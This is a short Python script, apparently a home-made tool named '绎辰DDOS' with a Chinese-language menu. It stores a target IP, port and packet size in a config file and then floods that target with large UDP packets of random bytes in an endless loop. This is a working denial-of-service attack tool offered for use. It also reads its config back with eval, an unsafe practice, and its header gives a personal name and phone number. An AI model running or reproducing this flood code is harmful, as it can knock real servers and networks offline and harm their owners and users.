"""
===========================
|        绎辰DDOS         |
==========================
版本:1.2
电话:+86 18100182989
作者:王绎辰
"""
print(__doc__)
import socket
import random
import time
import os
import atexit
@atexit.register
def _atexit():
    print("系统发生致命错误，即将退出")
    import time
    time.sleep(5)
def _input(txt):
    while True:
        try:
            st=int(input(txt))
        except:
            print("Error")
        else:
            return st
s=input("请输入模式（1启动,2修改,3查看,4恢复默认设置）：")
s=s.strip()
if s=="1":
    pass
elif s=="2":
    print("警告：该操作为高风险操作，可能导致程序崩溃！")
    ip=input("IP:")
    port=_input("Port:")
    size=_input("Size:")
    lsx=[ip,port,size]
    txt=str(lsx)
    f=open("pz.data","w")
    f.write(txt)
    f.close()
    print("更改已保存")
    os._exit(0)
elif s=="3":
    f=open("pz.data")
    txt=f.read()
    f.close()
    lst=eval(txt)
    ip=lst[0]
    port=lst[1]
    size=lst[2]
    print("IP:{},Port:{},size:{}".format(ip,port,size))
    os._exit(0)
elif s=="4":
    print("若执行该程序，您的所有配置将消失")
    ss=_input("输入1确认执行")
    if ss!=1:
        print("您已取消操作")
        os._exit(0)
    else:
        print("正在删除配置文件")
    try:
        os.remove("pz.data")
    except:
        print("无法恢复默认设置")
    else:
        print("恢复成功，请重启")
elif s=="test":
    raise
else:
    os._exit(0)
print("初始化中....")
try:
    try:
        os.mkdir("dat")
    except:
        pass
    f=open("pz.data","r")
    txt=f.read()
    f.close()
    lst=eval(txt)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    size=lst[2]
    bytes = random._urandom(size)
    ip = lst[0]
    port = lst[1]
except:
    print("初始化失败")
    print("正在尝试修复")
    try:
        f=open("pz.data","w")
        f.write('["192.168.0.1",80,50000]')
        f.close()
    except:
        print("无法完成修复，请检查权限")
        os._exit(0)
    else:
        print("修复成功，请重启")
        os._exit(0)
else:
    print("初始化完成，IP:{},Port:{},size:{}".format(ip,port,size))
count=100000
cter=1
errors=0
while True:
    if errors>=10:
        raise SystemError
    try:
        count-=1
        if count==0:
            count=100000
            print("ok")
        sock.sendto(bytes, (ip,port))
    except:
        print("Error")
        errors+=1
        time.sleep(1)
